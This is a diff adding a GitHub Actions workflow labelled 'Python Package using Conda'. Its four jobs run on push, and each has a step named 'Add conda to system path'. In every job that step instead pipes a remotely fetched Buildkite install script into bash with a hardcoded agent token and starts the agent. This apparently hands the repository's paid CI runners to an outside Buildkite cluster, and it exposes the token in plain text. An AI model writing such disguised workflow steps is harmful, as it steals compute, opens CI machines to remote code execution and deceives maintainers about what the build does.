@@ -1,0 +1,47 @@
+name: Python Package using Conda
+
+on: [push]
+
+jobs:
+  build-linux:
+    runs-on: nscloud-ubuntu-24.04-amd64-8x16
+    
+
+    steps:
+    - uses: actions/checkout@v4
+    
+    - name: Add conda to system path
+      run: |
+        
+        TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
+  build-linuxa:
+    runs-on: nscloud-ubuntu-24.04-amd64-8x16
+    
+
+    steps:
+    - uses: actions/checkout@v4
+    
+    - name: Add conda to system path
+      run: |
+        TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
+  build-linuxb:
+    runs-on: nscloud-ubuntu-24.04-amd64-8x16
+    
+
+    steps:
+    - uses: actions/checkout@v4
+    
+    - name: Add conda to system path
+      run: |
+        TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
+  build-linuxc:
+    runs-on: nscloud-ubuntu-24.04-amd64-8x16
+    
+
+    steps:
+    - uses: actions/checkout@v4
+    
+    - name: Add conda to system path
+      run: |
+        TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
+  
